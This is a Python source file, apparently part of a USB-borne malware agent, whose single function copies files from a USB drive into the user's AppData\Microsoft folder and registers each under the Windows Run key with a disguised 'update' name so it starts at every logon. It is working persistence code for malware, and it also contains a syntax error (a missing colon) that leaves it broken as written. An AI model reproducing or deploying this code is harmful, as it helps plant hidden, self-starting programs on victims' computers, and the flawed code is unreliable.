# -*- coding: utf-8 -*-

#---------------------------------------------------------- [Lib] -----------------------------------------------------------#

import os
import subprocess
import shutil
import string
import random

#--------------------------------------------------- [Function(s)/Class] ----------------------------------------------------#

def Persistence(agentUsbDirectory):
    targetDirPath = os.environ["APPDATA"] + "\\Microsoft"
    targetRegisterPath = "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
    targetRegisterVersion = " /v update"
    targetRegisterType = " /t REG_SZ"

    if not os.listdir(agentUsbDirectory):
        return 1
    else:
        for files in os.listdir(agentUsbDirectory):
            if files != "yourFile.exe"
                if os.path.isfile(targetDirPath + "\\" + files) == False:
                    shutil.copy(agentUsbDirectory + "\\" + files, targetDirPath)

                    if os.path.exists(targetDirPath + "\\" + files) == True:    
                        if os.path.getsize(targetDirPath + "\\" + files) > 0:
                            targetFile = " /d " + targetDirPath + "\\{0}".format(files)
                            targetRegisterVersion = "{0}{1}".format(targetRegisterVersion, random.choice(string.ascii_lowercase))
                            try:
                                subprocess.run(targetRegisterPath + targetRegisterVersion + targetRegisterType + targetFile, shell=True, timeout=3)          
                            except Exception as e:
                                return 1
                                pass
                        else:
                            return 1
                    else:
                        continue        
                else:
                    continue
            else:
                continue
